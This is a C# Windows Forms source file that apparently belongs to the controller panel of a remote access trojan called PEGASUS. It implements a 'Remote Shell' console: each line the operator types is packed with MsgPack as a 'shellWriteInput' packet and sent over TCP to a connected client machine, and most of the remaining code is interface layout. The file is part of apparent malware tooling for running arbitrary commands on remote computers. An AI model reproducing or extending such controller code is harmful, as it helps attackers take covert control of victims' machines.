using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Forms
{

	public class FormShell : Form
	{
		private IContainer components;

		private TextBox textBox1;

		public RichTextBox richTextBox1;

		private Panel panel1;

		public System.Windows.Forms.Timer timer1;

		private Guna2Panel guna2Panel1;

		private Guna2PictureBox guna2PictureBox1;

		private Label label1;

		private PictureBox pictureBox1;

		private Guna2Separator guna2Separator1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		public PEGASUSMain F { get; set; }

		internal Clients Client { get; set; }

		public FormShell()
		{
			InitializeComponent();
		}

		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(textBox1.Text))
			{
				if (textBox1.Text == "cls".ToLower())
				{
					richTextBox1.Clear();
					textBox1.Clear();
				}
				if (textBox1.Text == "exit".ToLower())
				{
					Close();
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = textBox1.Text;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
				textBox1.Clear();
			}
		}

		private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = "exit";
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Client.TcpClient.Connected)
				{
					Close();
				}
			}
			catch
			{
				Close();
			}
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormShell));
			richTextBox1 = new System.Windows.Forms.RichTextBox();
			textBox1 = new System.Windows.Forms.TextBox();
			timer1 = new System.Windows.Forms.Timer(components);
			panel1 = new System.Windows.Forms.Panel();
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label1 = new System.Windows.Forms.Label();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			SuspendLayout();
			richTextBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			richTextBox1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			richTextBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			richTextBox1.ForeColor = System.Drawing.Color.FromArgb(248, 248, 242);
			richTextBox1.Location = new System.Drawing.Point(0, 72);
			richTextBox1.Margin = new System.Windows.Forms.Padding(2);
			richTextBox1.Name = "richTextBox1";
			richTextBox1.ReadOnly = true;
			richTextBox1.Size = new System.Drawing.Size(533, 377);
			richTextBox1.TabIndex = 0;
			richTextBox1.Text = "";
			textBox1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			textBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
			textBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			textBox1.ForeColor = System.Drawing.Color.LightGray;
			textBox1.Location = new System.Drawing.Point(31, 455);
			textBox1.Margin = new System.Windows.Forms.Padding(2);
			textBox1.Multiline = true;
			textBox1.Name = "textBox1";
			textBox1.Size = new System.Drawing.Size(502, 20);
			textBox1.TabIndex = 1;
			textBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(TextBox1_KeyDown);
			timer1.Interval = 1000;
			timer1.Tick += new System.EventHandler(Timer1_Tick);
			panel1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panel1.Dock = System.Windows.Forms.DockStyle.Left;
			panel1.Location = new System.Drawing.Point(0, 72);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(31, 403);
			panel1.TabIndex = 2;
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(pictureBox1);
			guna2Panel1.Controls.Add(label1);
			guna2Panel1.Controls.Add(guna2PictureBox1);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(533, 72);
			guna2Panel1.TabIndex = 3;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-383, 66);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1299, 10);
			guna2Separator1.TabIndex = 13;
			guna2Separator1.UseTransparentBackground = true;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 12);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 42);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 12;
			pictureBox1.TabStop = false;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(212, 23);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(76, 19);
			label1.TabIndex = 11;
			label1.Text = "Console";
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(492, 13);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 29);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 7;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(533, 475);
			base.Controls.Add(richTextBox1);
			base.Controls.Add(textBox1);
			base.Controls.Add(panel1);
			base.Controls.Add(guna2Panel1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			base.Name = "FormShell";
			Text = "Remote Shell";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormShell_FormClosed);
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}